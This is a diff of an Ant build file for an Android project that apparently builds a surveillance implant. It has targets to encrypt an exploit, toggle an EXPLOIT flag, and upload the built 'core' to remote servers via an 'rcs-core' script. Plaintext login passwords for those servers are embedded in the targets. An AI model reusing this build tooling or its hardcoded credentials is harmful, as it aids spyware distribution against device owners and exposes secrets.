@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <project name="android_service" default="help">
 
-	
 	<taskdef resource="net/sf/antcontrib/antlib.xml">
 		<classpath>
 			<pathelement location="antlibs/ant-contrib-1.0b3.jar" />
@@ -13,7 +12,7 @@
 			<pathelement location="antlibs/ant-contrib-1.0b3.jar" />
 		</classpath>
 	</taskdef>
-	
+
 
 	<taskdef name="crypter" classname="com.example.ant.Crypter">
 		<classpath>
@@ -38,9 +37,11 @@
 	<property name="ruby.path" value="C:/Ruby193/bin" />
 	<property name="rcscore.path" value="C:/HT/rcs-core-build" />
 	<import file="${sdk.dir}/tools/ant/build.xml" />
-	
+
+	<property file="version" />
+
 	<fail message="sdk.dir is missing. Make sure to generate local.properties using 'android update project'" unless="sdk.dir" />
-		
+
 	<!-- version-tag: 2011102401 -->
 	<!-- import file="${sdk.dir}/tools/ant/build.xml" -->
 
@@ -49,8 +50,8 @@
 		<pathelement path="${sdk.dir}/tools/lib/sdklib.jar" />
 		<pathelement path="${sdk.dir}/tools/lib/androidprefs.jar" />
 	</path>
-	
-	
+
+
 	<!-- extension targets. Uncomment the ones where you want to do custom work
 	     in between standard targets -->
 	<filterset id="dateFilterSet">
@@ -104,6 +105,16 @@
 	<target name="libsexp" depends="encrypt-messages, encrypt-exploit, encrypt-manifest">
 	</target>
 
+
+	<target name="init" depends="salt" unless="build.number">
+		<tstamp>
+			<format property="timestamp.BUILD" pattern="yyyyMMdd-hhmmss" />
+		</tstamp>
+		<property file="build.number" />
+		<echo message="timestamp ${timestamp.BUILD}" />
+		<echo message="build.number ${build.number}" />
+	</target>
+
 	<!-- = = = = = = = = = = = = = = = = =
           macrodef: set-cfg
           copies Cfg.java considering:
@@ -113,14 +124,14 @@
          = = = = = = = = = = = = = = = = = -->
 	<macrodef name="set-cfg">
 		<attribute name="kind" />
-		<attribute name="version" />
+		<attribute name="osversion" />
 		<sequential>
-			<echo message="version: @{version}" />
+			<echo message="osversion: @{osversion}" />
 			<echo message="kind: @{kind}" />
 
 			<iff>
 				<and>
-					<equals arg1="@{version}" arg2="v2" />
+					<equals arg1="@{osversion}" arg2="v2" />
 					<not>
 						<equals arg1="@{kind}" arg2="debug" />
 					</not>
@@ -177,6 +188,8 @@
 			<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" overwrite="true" />
 			<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
 				<filterset>
+					<filter token="BUILD_ID" value="${build.number}" />
+					<filter token="BUILD_TIMESTAMP" value="${timestamp.BUILD}" />
 					<filter token="DEBUG" value="${isdebug}" />
 					<filter token="EXCEPTION" value="${isdebug}" />
 					<filter token="EXPLOIT" value="${isexploit}" />
@@ -184,10 +197,53 @@
 					<filter token="KEYS" value="false" />
 					<filter token="FILE" value="true" />
 					<filter token="RANDOM" value="${randomSalt}" />
-					<filter token="VERSION" value="@{version}" />
+					<filter token="OSVERSION" value="@{osversion}" />
+					<filter token="VERSION" value="${version}" />
 				</filterset>
 			</copy>
 
+		</sequential>
+	</macrodef>
+
+
+	<macrodef name="updaterelease">
+		<attribute name="server" />
+		<attribute name="login" />
+		<attribute name="password" />
+		<attribute name="file" />
+		<sequential>
+			<echo>@{server}</echo>
+
+			<exec executable="${ruby.path}/ruby.exe" dir="." failonerror="true">
+				<arg value="${rcscore.path}/rcs-core.rb" />
+				<arg value="-u" />
+				<arg value="@{login}" />
+				<arg value="-p" />
+				<arg value="@{password}" />
+				<arg value="-d" />
+				<arg value="@{server}" />
+				<arg value="-n" />
+				<arg value="android" />
+				<arg value="-R" />
+				<arg value="@{file}" />
+			</exec>
+
+		</sequential>
+	</macrodef>
+
+	<macrodef name="zipdist">
+		<attribute name="destfile" />
+		<sequential>
+			<zip destfile="@{destfile}">
+				<zipfileset dir="RCSAndroid" prefix="RCSAndroid" />
+				<zipfileset dir="crypter" prefix="crypter" />
+				<zipfileset dir="." includes="server" />
+				<fileset dir="." includes="local.properties" />
+				<fileset dir="." includes="ant.properties" />
+				<fileset dir="." includes="build.xml" />
+				<fileset dir="." includes="build.number" />
+				<fileset dir="." includes="version" />
+			</zip>
 		</sequential>
 	</macrodef>
 
@@ -206,7 +262,7 @@
 
 	</target>
 
-	<target name="dist" depends="build">
+	<target name="distold" depends="build">
 		<input message="Version (8.1_RC1)?" addproperty="do.version" defaultvalue="8.1_RC1" />
 		<mkdir dir="../dist/${do.version}" />
 		<copy file="bin/core.android" toDir="../dist/${do.version}" overwrite="true" />
@@ -217,35 +273,6 @@
 			</fileset>
 		</checksum>
 	</target>
-
-
-	<macrodef name="updaterelease">
-		<attribute name="server" />
-		<attribute name="login" />
-		<attribute name="password" />
-		<attribute name="file" />
-		<attribute name="filename" />
-		<sequential>
-			<echo>@{server}</echo>
-
-			<exec executable="${ruby.path}/ruby.exe" dir="." failonerror="true">
-				<arg value="${rcscore.path}/rcs-core.rb" />
-				<arg value="-u" />
-				<arg value="@{login}" />
-				<arg value="-p" />
-				<arg value="@{password}" />
-				<arg value="-d" />
-				<arg value="@{server}" />
-				<arg value="-n" />
-				<arg value="android" />
-				<arg value="-a" />
-				<arg value="@{file}" />
-				<arg value="-A" />
-				<arg value="@{filename}" />
-			</exec>
-
-		</sequential>
-	</macrodef>
 
 	<target name="update">
 		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="bin/core.android" filename="core" />
@@ -259,42 +286,84 @@
 		<echo>ant update : uploads the core to castore</echo>
 	</target>
 
-	<target name="build" depends="salt">
-		<for list="v2,vdefault" param="version">
+	<target name="build" depends="init">
+		<buildnumber />
+		<delete dir="output"/>
+		<for list="v2,default" param="osversion">
 			<sequential>
 				<echo message="==============" />
 				<echo message="===  BUILD === ------------------------------------------------------------" />
 				<echo message="==============" />
-				<echo>Version @{version}</echo>
+				<echo>Version @{osversion}</echo>
 
 				<for list="debug,release" param="kind">
 					<sequential>
 						<antcall target="clean" />
 
-						<echo message="bin/@{version}/@{kind}/core.android" />
-						<set-cfg version="@{version}" kind="@{kind}" />
-						<mkdir dir="output/@{version}/@{kind}" />
-
+						<echo message="bin/@{osversion}/@{kind}/core.android" />
+						<set-cfg osversion="@{osversion}" kind="@{kind}" />
+					    
 						<iff>
 							<equals arg1="@{kind}" arg2="debug" />
 							<then>
 								<echo message="==============" />
 								<echo>call debug</echo>
 								<antcall target="debug" inheritAll="false" />
-								<copy file="bin/android_service-debug.apk" toFile="output/@{kind}/@{version}/core.android" overwrite="true" />
+								<var name="filename" value="bin/android_service-debug.apk" />
+
 							</then>
 							<else>
 								<echo message="==============" />
 								<echo>call release</echo>
 								<antcall target="release" inheritAll="false" />
-								<copy file="bin/android_service-release-unsigned.apk" toFile="output/@{kind}/@{version}/core.android" overwrite="true" />
+								<var name="filename" value="bin/android_service-release-unsigned.apk" />
 							</else>
 						</iff>
-
+						
+						<mkdir dir="output/@{kind}/" />
+						<copy file="${filename}" toFile="output/@{kind}/core.android.@{osversion}.apk" overwrite="true" />
 					</sequential>
 				</for>
 			</sequential>
 		</for>
+	</target>
+
+	<target name="updatezenotto">
+		<updaterelease server="zenotto" login="admin" password="adminp123" file=".\server\android_${version}.zip" />
+		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
+	</target>
+
+	<target name="servercore">
+		<mkdir dir="server/core" />
+
+		<copy toDir="server/core" overwrite="true">
+			<fileset dir="output/release/" />
+		</copy>
+
+		<zip destfile="server/android_${version}.zip" basedir="server/core" />
+	</target>
+
+
+	<target name="dist" depends="init">
+
+		<input message="Release (8.0)?" addproperty="do.release" defaultvalue="8.0" />
+		<var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
+		<echo>${destdir}</echo>
+		<mkdir dir="${destdir}" />
+
+		<antcall target="servercore" />
+		<copy file="server/android_${version}.zip" toDir="${destdir}" overwrite="true" />
+
+		<zipdist destfile="${destdir}/android_sources.zip" />
+
+		<checksum>
+			<fileset dir="${destdir}/">
+				<include name="*" />
+			</fileset>
+		</checksum>
+
+		<antcall target="update" />
+
 	</target>
 
 </project>
